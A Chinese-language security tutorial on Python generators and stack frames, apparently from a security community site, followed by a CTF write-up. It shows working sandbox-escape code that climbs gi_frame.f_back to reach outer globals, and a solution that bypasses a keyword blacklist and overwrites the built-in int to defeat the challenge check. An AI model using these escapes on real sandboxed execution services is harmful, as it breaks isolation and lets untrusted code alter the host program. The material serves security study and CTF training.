

# Python 利用栈帧沙箱逃逸 - 先知社区

Python 利用栈帧沙箱逃逸

- - -

# 生成器

生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。

在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。

## 简单的例子

计数：

```plain
def f():
    a=1
    while True:
        yield a
        a+=1
f=f()
print(next(f)) #1
print(next(f)) #2
print(next(f)) #3
```

如果我们给 a 定义一个范围，a<=100

```plain
def f():
    a=1
    for i in range(100):
        yield a
        a+=1
f=f()
```

也可以使用 for 语句一次性输出

```plain
for value in f:
    print(value)
```

## 生成器表达式

生成器表达式是一种在 Python 中创建生成器的紧凑形式。类似于列表推导式，生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。

生成器表达式的语法与列表推导式类似，但是使用圆括号而不是方括号。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用。

在一个有逻辑范围的情况下下可以通过生成器表达式去实现，如计数 1-100:

```plain
a=(i+1 for i in range(100))
#next(a)
for value in a:
    print(value)
```

## 生成器的属性

`gi_code`: 生成器对应的 code 对象。  
`gi_frame`: 生成器对应的 frame（栈帧）对象。  
`gi_running`: 生成器函数是否在执行。生成器函数在 yield 以后、执行 yield 的下一行代码前处于 frozen 状态，此时这个属性的值为 0。  
`gi_yieldfrom`：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。  
`gi_frame.f_locals`：一个字典，包含生成器当前帧的本地变量。

**着重介绍一下 gi\_frame 属性**  
`gi_frame` 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。

下面是一个简单的示例，演示了如何使用生成器的 gi\_frame 属性来获取生成器的当前帧信息：

```plain
def my_generator():
    yield 1
    yield 2
    yield 3

gen = my_generator()

# 获取生成器的当前帧信息
frame = gen.gi_frame

# 输出生成器的当前帧信息
print("Local Variables:", frame.f_locals)
print("Global Variables:", frame.f_globals)
print("Code Object:", frame.f_code)
print("Instruction Pointer:", frame.f_lasti)
```

## 栈帧 (frame)

在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。

栈帧包含了以下几个重要的属性：  
`f_locals`: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。  
`f_globals`: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。  
`f_code`: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。  
`f_lasti`: 整数，表示最后执行的字节码指令的索引。  
`f_back`: 指向上一级调用栈帧的引用，用于构建调用栈。

# 利用栈帧沙箱逃逸

原理就是通过生成器的栈帧对象通过 f\_back（返回前一帧）从而逃逸出去获取 globals 全局符号表  
例如：

```plain
s3cret="this is flag"

codes='''
def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={}
code = compile(codes, "test", "exec")
exec(code,locals)
print(locals["b"])
```

运行得到 `this is flag` ,成功逃逸出沙箱获取到`s3cret`变量值

这里也可以使用`f_locals`去代替`f_globals`效果是相同的，但是要注意，`locals`返回的是局部符号表，它包含了在当前函数或方法内部定义的变量。这些局部变量只在当前函数或方法的执行过程中存在，并且只能在该函数或方法内部访问。当函数执行完毕后，这些局部变量就会被销毁。

## globals 中的\_\_builtins 字段

`__builtins__` 模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。  
使用 dir(`__builtins__`) 来查看所有可用的内置函数和异常的列表

```plain
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BaseExceptionGroup', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EncodingWarning', 'EnvironmentError', 'Exception', 'ExceptionGroup', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'aiter', 'all', 'anext', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

## 例题

2024L3HCTF

```plain
import sys
import os

codes='''
<<codehere>>
'''

try:
    codes.encode("ascii")
except UnicodeEncodeError:
    exit(0)

if "__" in codes:
    print("__ bypass!!")
    exit(0)

codes+="\nres=factorization(c)"
print(codes)
locals={"c":"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863","__builtins__": None}
res=set()

def blackFunc(oldexit):
    def func(event, args):
        blackList = ["process","os","sys","interpreter","cpython","open","compile","__new__","gc"]
        for i in blackList:
            if i in (event + "".join(str(s) for s in args)).lower():
                print("noooooooooo")
                print(i)
                oldexit(0)
    return func

code = compile(codes, "<judgecode>", "exec")
sys.addaudithook(blackFunc(os._exit))
exec(code,{"__builtins__": None},locals)
print(locals)

p=int(locals["res"][0])
q=int(locals["res"][1])
if(p>1e5 and q>1e5 and p*q==int("696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863")):
    print("Correct!",end="")
else:
    print("Wrong!",end="")
```

上述代码大概就是通过 exec 执行任意代码，返回的 p 和 q 需要满足 if 语句  
代码存在过滤，首选不能使用`__`

```plain
if "__" in codes:
    print("__ bypass!!")
    exit(0)
```

还有过滤一些属性，这导致不能使用 gc 去获取对象引用

```plain
blackList = ["process","os","sys","interpreter","cpython","open","compile","__new__","gc"]
```

最关键的是 `{"__builtins__": None}` 置空了`__builtins__`

```plain
exec(code,{"__builtins__": None},locals)
```

根据上述条件，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的 globals

```plain
a=(a.gi_frame.f_back.f_back for i in [1])
a=[x for x in a][0]
globals=a.f_back.f_back.f_globals
```

因为设置了 {"**builtins**": None} ，所以不能直接通过 next() 函数去获取到栈帧，但可以通过 for 语句去获取

```plain
a=[x for x in a][0]
```

观察判断语句

```plain
if(p>1e5 and q>1e5 and p*q==int("69...97863")):
```

p 和 q 就是`factorization`的两个返回值  
首先 p 和 q 都得大于 100000，其次就是 p 和 q 的积为 int("69...97863")  
按照题目要求，如果通过算法在要求的 5 秒实现基本上是不可能的  
我们可以通过沙箱外的 globals 的`__builtins__`字段去修改 int 函数，实现绕过 if 语句  
写个假 int 函数

```plain
def fake_int(i):
    return 100001 * 100002
```

然后将沙箱外部的 int 函数修改为 fakeint 函数即可

```plain
def fake_int(i):
    return 100001 * 100002
a=(a.gi_frame.f_back.f_back for i in [1])
a=[x for x in a][0]
builtin =a.f_back.f_back.f_globals["_"*2+"builtins"+"_"*2]
builtin.int=fake_int
```

参考： 
[https://blog.csdn.net/MXB\_1220/article/details/124638449](https://blog.csdn.net/MXB_1220/article/details/124638449)  
[https://blog.csdn.net/spiritx/article/details/132504456](https://blog.csdn.net/spiritx/article/details/132504456)
